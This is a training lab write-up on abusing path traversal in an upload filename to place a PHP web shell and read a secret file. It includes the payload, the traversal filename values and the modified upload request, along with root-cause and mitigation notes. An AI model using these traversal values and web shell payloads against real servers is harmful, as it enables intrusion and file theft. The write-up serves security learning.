# Lab: Web shell upload via path traversal

## Overview

This lab demonstrates a file upload vulnerability where the application allows path traversal sequences in the uploaded filename.

By manipulating the filename parameter during upload, an attacker can escape the intended upload directory and place a PHP file into a web-accessible location, resulting in Remote Code Execution (RCE).

---

## Objective

Upload a PHP web shell using path traversal and retrieve the secret stored on the server.

---

## Tools Used

- Burp Suite Community Edition
- Firefox Browser
- Kali Linux
- PHP Web Shell

---

## Vulnerability Explanation

The application stores uploaded avatars inside the `avatars/` directory.

However, it fails to properly sanitize directory traversal sequences supplied in the filename parameter.

An attacker can upload a PHP file and modify the filename to:

```text
../temp.php
```

or URL-encoded variants such as:

```text
..%2ftemp.php
```

This causes the file to be written outside the intended directory and placed in a location where PHP code is executed by the server.

---

# PHP Payload Used

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

This payload reads the secret file and displays its contents in the browser.

---

# Steps to Reproduce

## 1. Open the Lab

Login to the application and navigate to the avatar upload functionality.

---

## 2. Create Malicious PHP File

Create a file named:

```bash
temp.php
```

Add the following code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## 3. Intercept Upload Request

Upload the PHP file and intercept the request using Burp Suite.

Send the request to **Repeater**.

Locate the filename parameter:

```http
filename="temp.php"
```

Modify it to:

```http
filename="../temp.php"
```

or

```http
filename="..%2ftemp.php"
```

to perform path traversal.

---

## 4. Send Modified Request

Click **Send** in Burp Repeater.

The application accepts the upload and stores the file outside the avatars directory.

Response:

```text
The file avatars/../temp.php has been uploaded.
```

---

## 5. Access Uploaded PHP File

Navigate to:

```http
GET /files/temp.php HTTP/2
```

Since the file is now located in a web-accessible directory, the server executes the PHP code.

---

## 6. Retrieve Secret

The response displays the contents of:

```text
/home/carlos/secret
```

Example:

```text
Fx1hbFye6lkuDgljUPiIMlS2CDpLWw20
```

This confirms successful Remote Code Execution.

---

# Proof of Concept

## Malicious File

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## Modified Upload Request

```http
POST /my-account/avatar HTTP/2

Content-Disposition: form-data; name="avatar"; filename="../temp.php"
Content-Type: application/x-php
```

---

## File Access Request

```http
GET /files/temp.php HTTP/2
```

---

## Response

```text
Fx1hbFye6lkuDgljUPiIMlS2CDpLWw20
```

---

# Impact

- Remote Code Execution (RCE)
- Arbitrary file upload
- Arbitrary file read
- Web shell deployment
- Server compromise
- Privilege escalation opportunities

---

# Root Cause

The application does not properly sanitize filename inputs before saving uploaded files.

As a result:

- Path traversal sequences are accepted
- Upload directory restrictions are bypassed
- Files can be written to unintended locations
- Executable files become accessible through the web server

---

# Mitigation

- Remove path traversal sequences from filenames
- Use server-generated filenames
- Validate and normalize file paths
- Restrict uploads to dedicated directories
- Disable script execution in upload folders
- Perform strict allowlist validation
- Store uploaded files outside the web root

---

# Key Learnings

- Learned how path traversal affects file uploads
- Understood directory traversal through filename manipulation
- Practiced modifying multipart requests in Burp Suite
- Learned how uploaded PHP files can lead to RCE
- Gained hands-on experience exploiting insecure file upload mechanisms
